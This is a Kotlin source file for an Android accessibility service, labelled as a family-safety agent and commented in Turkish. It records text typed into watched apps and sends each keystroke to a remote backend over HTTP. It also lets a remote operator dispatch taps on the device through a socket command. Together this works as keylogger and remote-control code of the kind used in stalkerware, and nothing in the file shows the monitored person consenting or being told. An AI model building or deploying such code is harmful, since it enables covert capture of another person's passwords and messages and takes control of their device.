package com.familysafety.agent

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class SafetyAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "SafetyAccessibility"

        // SocketManager'ın remote_click komutunu bu servise iletmesi için singleton referans
        @Volatile
        var instance: SafetyAccessibilityService? = null
    }

    private val ioScope = CoroutineScope(Dispatchers.IO)

    // ── Lifecycle ──────────────────────────────────────────────────────────────

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100L
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }
        serviceInfo = info
        Log.d(TAG, "AccessibilityService bağlandı")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    // ── Klavye Takibi ──────────────────────────────────────────────────────────

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return

        val packageName = event.packageName?.toString() ?: return
        val text = event.text.joinToString("") { it }
        if (text.isBlank()) return

        // Yalnızca izlenen paketlerden gelen klavye girişini gönder
        if (packageName !in Config.watchedPackages) return

        ioScope.launch {
            sendKeystroke(packageName, text)
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "AccessibilityService interrupted")
    }

    // ── HTTP Gönderim ──────────────────────────────────────────────────────────

    private fun sendKeystroke(packageName: String, text: String) {
        try {
            val appName = packageName.split(".").lastOrNull() ?: packageName
            val payload = JSONObject().apply {
                put("app_name", appName)
                put("package", packageName)
                put("text", text)
            }
            val url = URL(
                "${Config.backendUrl}/api/android-keystrokes/${Config.profileId}"
            )
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-API-Key", Config.API_KEY)
            conn.doOutput = true
            conn.connectTimeout = 4000
            conn.readTimeout = 4000
            OutputStreamWriter(conn.outputStream, Charsets.UTF_8).use {
                it.write(payload.toString())
            }
            Log.d(TAG, "Keystroke → ${conn.responseCode} [$appName] $text")
            conn.disconnect()
        } catch (e: Exception) {
            Log.e(TAG, "Keystroke gönderilemedi: ${e.message}")
        }
    }

    // ── Uzaktan Tıklama (Remote Gesture) ──────────────────────────────────────

    fun performRemoteClick(xPercent: Float, yPercent: Float) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            Log.w(TAG, "dispatchGesture API 24+ gerektirir")
            return
        }
        try {
            val metrics = resources.displayMetrics
            val xPx = xPercent * metrics.widthPixels
            val yPx = yPercent * metrics.heightPixels

            val path = Path().apply { moveTo(xPx, yPx) }
            val stroke = GestureDescription.StrokeDescription(path, 0L, 100L)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()

            dispatchGesture(gesture, object : GestureResultCallback() {
                override fun onCompleted(gestureDescription: GestureDescription?) {
                    Log.d(TAG, "Gesture tamamlandı: ($xPx, $yPx)")
                }
                override fun onCancelled(gestureDescription: GestureDescription?) {
                    Log.w(TAG, "Gesture iptal edildi")
                }
            }, null)
        } catch (e: Exception) {
            Log.e(TAG, "Gesture gönderilemedi: ${e.message}")
        }
    }
}
